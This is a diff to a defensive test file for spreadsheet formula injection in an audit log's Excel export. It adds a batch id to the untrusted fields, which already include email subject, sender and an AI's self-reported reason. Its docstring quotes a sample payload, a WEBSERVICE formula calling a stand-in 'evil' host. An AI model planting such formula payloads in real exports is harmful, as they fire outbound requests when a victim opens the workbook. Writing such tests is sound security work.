@@ -1,10 +1,11 @@
 """Adversarial payload tests for SEC-03: spreadsheet formula injection in
 the audit log's Excel export.
 
-`summary`, `sender`, `pii_match_details` and `claude_reason` are all
-externally-influenced -- an email subject/sender, matched PII text, or
-Claude's self-reported "reason" string -- and all four land in a cell via
-``ws.append()`` in ``audit_log.export_week_to_excel``. Without
+`summary`, `sender`, `pii_match_details`, `claude_reason` and `batch_id` are
+all externally-influenced -- an email subject/sender, matched PII text,
+Claude's self-reported "reason" string, or (while it remains
+client-supplied) the approval binder's batch id -- and all five land in a
+cell via ``ws.append()`` in ``audit_log.export_week_to_excel``. Without
 neutralisation, a value like ``"=WEBSERVICE(\"http://evil\")"`` in any of
 them becomes a live formula in the exported workbook: openpyxl itself
 classifies a string starting with "=" as a formula (not just an Excel
@@ -48,6 +49,7 @@ FIELDS = [
     ("sender", 7),
     ("pii_match_details", 13),
     ("claude_reason", 14),
+    ("batch_id", 21),
 ]
 
 
